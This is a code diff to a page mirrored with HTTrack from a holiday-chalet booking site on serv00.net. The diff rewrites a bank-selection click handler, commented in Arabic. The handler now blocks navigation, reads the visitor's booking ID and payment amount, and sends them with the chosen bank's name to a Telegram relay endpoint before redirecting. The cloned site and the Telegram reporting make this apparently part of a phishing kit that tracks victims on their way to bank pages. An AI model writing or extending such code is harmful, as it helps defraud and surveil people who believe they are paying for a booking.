@@ -568,6 +568,9 @@
 </body>
 <!-- Mirrored from tonfree.serv00.net/chalet/bank.html by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 03 Oct 2025 00:17:02 GMT -->
 </html>
+<!-- تحميل ملف أسماء البنوك -->
+<script src="bank-names.js"></script>
+
 <!-- كود تتبع اختيار البنك وإرسال إلى تليجرام -->
 <script>
 document.addEventListener('DOMContentLoaded', function() {
@@ -577,13 +580,22 @@ document.addEventListener('DOMContentLoaded', function() {
     // إضافة مستمع حدث لكل رابط
     bankLinks.forEach(function(link) {
         link.addEventListener('click', function(e) {
+            // منع الانتقال الفوري
+            e.preventDefault();
+            
             // الحصول على اسم البنك من الصورة
             const img = this.querySelector('img');
-            const bankName = img ? (img.alt || img.src.split('/').pop()) : 'بنك غير معروف';
+            let bankName = 'بنك غير معروف';
+            
+            if (img) {
+                // استخدام دالة getBankNameFromImage للحصول على الاسم الصحيح
+                bankName = getBankNameFromImage(img.src);
+            }
             
             // الحصول على بيانات الحجز من localStorage
             const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
             const bookingId = bookingData.bookingId || 'غير متوفر';
+            const amount = bookingData.amount || 'غير متوفر';
             
             // إرسال البيانات إلى API
             fetch('/api/telegram/bank-selection', {
@@ -594,19 +606,21 @@ document.addEventListener('DOMContentLoaded', function() {
                 body: JSON.stringify({
                     bankName: bankName,
                     bookingId: bookingId,
+                    amount: amount,
                     timestamp: new Date().toISOString()
                 })
             })
             .then(response => response.json())
             .then(data => {
                 console.log('تم إرسال اختيار البنك إلى تليجرام:', data);
+                // الانتقال إلى صفحة البنك بعد إرسال البيانات
+                window.location.href = link.href;
             })
             .catch(error => {
                 console.error('خطأ في إرسال البيانات:', error);
+                // حتى لو فشل الإرسال، نستمر في العملية
+                window.location.href = link.href;
             });
-            
-            // السماح بالانتقال إلى صفحة البنك
-            return true;
         });
     });
 });
